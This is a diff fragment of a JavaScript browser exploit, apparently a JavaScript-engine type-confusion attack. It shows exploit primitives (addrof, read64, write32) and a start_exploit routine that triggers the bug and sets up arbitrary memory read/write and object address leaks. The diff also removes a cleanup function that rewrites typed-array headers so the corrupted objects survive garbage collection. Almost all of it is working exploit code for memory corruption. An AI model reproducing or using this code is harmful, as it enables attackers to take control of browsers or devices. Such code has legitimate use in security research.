@@ -295,32 +295,12 @@ function addrof(obj) {
     return read64(g_leaker_addr);
 }
 
-function cleanup() {
-
-
-    var u32array = new Uint32Array(8);
-    header = read(addrof(u32array), 0x10);
-
-    // Set length to 0x10 and flags to 0x1
-    // Will behave as OversizeTypedArray which can survive gc easily
-    write32(addrof(g_arb_master).add32(0x18), 0x10);
-    write32(addrof(g_arb_master).add32(0x1C), 0x1); //
-    write32(addrof(g_confuse_obj['0a']).add32(0x18), 0x10);
-    write32(addrof(g_confuse_obj['0a']).add32(0x1C), 0x1);
-    write32(addrof(g_arb_slave).add32(0x1C), 0x1);
-    var empty = {};
-    header = read(addrof(empty), 0x8);
-    write(addrof(g_fake_container), header);
-}
-
 function start_exploit() {
     
     trigger();
     setup_arb_rw();
     setup_obj_leaks();
 }
-
-
 
 var prim = {
     write8: function (addr, val) {
